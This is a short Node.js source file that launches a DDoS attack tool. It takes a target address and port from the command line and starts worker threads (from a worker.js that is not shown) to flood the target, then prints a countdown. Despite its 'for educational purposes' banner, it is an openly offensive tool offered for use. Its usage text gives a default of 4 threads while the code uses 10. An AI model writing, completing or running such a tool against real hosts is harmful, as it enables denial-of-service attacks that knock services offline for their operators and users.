const { Worker } = require('worker_threads');

console.log(`DDOS script for educational purposes!`)

const [node, dir, address, port, threads = 10, time = 99999999999999999999999999999999999999999999999999999999999999999999999999999999999099] = process.argv;

if (!address || !port) {
  return console.log('[ERROR] Use: \'node . <address> <port> [<threads> (default 4)] [<time> (in minutes)]\'')
}

for (let i = 0; i < threads; i++) {
  console.log(`[DDOS] Starting thread #${i}...`)

  const worker = new Worker('./worker.js');
  worker.postMessage({
    address,
    port,
    time,
    thread: i
  });
}

console.log("[DDOS]  will start in 3 seconds...")
console.log("[DDOS]  will start in 2 seconds...")
console.log("[DDOS]  will start in 1 seconds...")

